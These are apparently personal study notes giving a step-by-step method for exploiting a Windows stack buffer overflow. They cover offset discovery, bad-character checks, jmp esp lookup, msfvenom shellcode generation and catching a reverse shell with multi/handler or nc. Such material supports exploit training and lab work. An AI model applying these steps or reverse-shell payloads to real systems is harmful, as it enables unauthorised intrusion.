# Buffer overflow 
1. Trigger bug by sending lots of A's down the wire.
2. Expect a crash at 0x41414141

# Discover Offsets
1. pattern_create.rb -> overflow
2. !mona findmsp || pattern_offset.rb

# Test Offsets
1. send ("A" * offset) + "BBBB" + "CCCC"
    • EIP should land on "BBBB" 

# Discover bad chars
1. !mona cmp
    • msfvenom ... -b '\x00\x0a'
                       ^------^
                           » exclude bad chars in shellcode generator

# Find place to put shellcode
    • !mona jmp -r esp -cbp "\x00\x0a"
        - ESP is usually after saved return pointer overwrite
        - remember to put memory location in little endian
          - ret = struct.pack('<L', esp)

# Test for execution
    • use INT3 breakpoint ("\xcc") in place of shellcode to test for exec

# Try to pop calc
# https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
    msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b '\x00\x0a' -f python 

# NOP sled
    ("\x90"*16)
    (\x83\xec\x10) 
  msfvenom ... -n 16

# shellcode
  • windows/shell/reverse_tcp uses meterpreter multi-stage handler, must use msfconsole to connect
    use mutli/handler
    set payload windows/shell/reverse_tcp
    exploit

  • regular nc -nvlp reverse shell
    windows/shell_reverse_tcp


# hints
  • sometimes you need to send \n or \r after the payload so the vuln program will parse it 
